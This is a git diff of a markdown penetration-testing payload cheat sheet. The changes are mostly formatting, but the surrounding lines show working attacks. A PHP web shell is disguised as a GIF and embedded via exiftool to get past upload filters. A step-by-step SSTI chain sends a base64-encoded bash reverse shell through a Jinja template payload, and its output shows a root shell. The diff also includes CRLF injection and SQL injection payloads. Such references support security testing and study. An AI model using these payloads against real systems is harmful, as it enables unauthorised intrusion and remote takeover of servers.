@@ -22,7 +22,7 @@
   - [PHP filter](#php-filters-for-lfi)
   - [XSS](#xss-common-payloads)
   - [XXE](#xxe-common-payloads)
-  - [SSTI](#server-side-template-injection-ssti-to-rce)
+  - [SSTI](#server-side-template-injection-ssti)
   - [SSRF](#ssrf-common-payloads)
   - [CSRF](#csrf-common-payloads)
   - [CRLF](#crlf-common-payloads)
@@ -46,7 +46,7 @@
 # Bypass File Upload Filtering
 
 `GIF89a`
-```
+```php
 GIF89a;
 <?
 system($_GET['cmd']);
@@ -55,7 +55,7 @@ system($_GET['cmd']);
 
 `exiftool`
 
-```
+```php
 exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' evil.jpg
 
 mv evil.jpg evil.php.jpg
@@ -157,9 +157,9 @@ https://www.whitelisteddomain.tld@google.com/%2f..
 
 #### [source](https://github.com/payloadbox/xxe-injection-payload-list)
 --------------------------------------------------------------------------------------------------------------
-# Server Side Template Injection (SSTI) to RCE
+# Server Side Template Injection (SSTI)
 
-* Try this, everywhere the app is taking input from the user and reflecting the output.
+#### [1] Try this, everywhere the app is taking input from the user and reflecting the output.
 
 ```python
 {{7*7}}
@@ -168,8 +168,8 @@ ${7*7}
 ${{7*7}}
 #{7*7}
 ```
-* if the app reflects the output as `49`.Then there might be a RCE possible.
-* now encode the payload in basse64.
+#### [2] if the app reflects the output as `49`.Then there might be a RCE possible.
+#### [3] now encode the payload in basse64.
 
 `input`
 ```shell
@@ -179,16 +179,17 @@ echo 'bash -i >& /dev/tcp/LHOST/4444 0>&1' | base64
 ```
 c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA4LzQ0NDQgMD4mMQo=
 ```
-* now start a listener
+#### [4] now start a listener
 ```
 nc -lvvp 4444
 ```
 
+#### [5] resend the request with this command
 ```python
 {{config.__class__.__init__.__globals__['os'].popen('echo${IFS}c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA4LzQ0NDQgMD4mMQo=${IFS}|base64${IFS}-d|bash').read()}}
 ```
 
-* if everything works currectly. You should get a reverse shell.
+#### [6] if everything works currectly. You should get a reverse shell.
 ```shell
 nc -vv -lnp 4444
 Ncat: Version 7.92 ( https://nmap.org/ncat )
@@ -201,7 +202,7 @@ sh: 0: can't access tty; job control turned off
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-* or we can try those above commands also, if the previous one doesn't works.
+#### [+] or we can try those above commands also, if the previous one doesn't works.
 
 ```python
 {{ "foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("id").read()}}
@@ -290,7 +291,7 @@ xhr.send('{"role":admin}');
 ```http
 http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue
 ```
-response
+`response`
 ```http
 Connection: keep-alive
 Content-Length: 178
@@ -437,7 +438,7 @@ if(!$con)...
 -------------------------------------------------------------------------------------------------------
 # SQL injection payload list
 `Generic SQL Injection Payloads`
-```
+```sql
 '
 ''
 ' or "
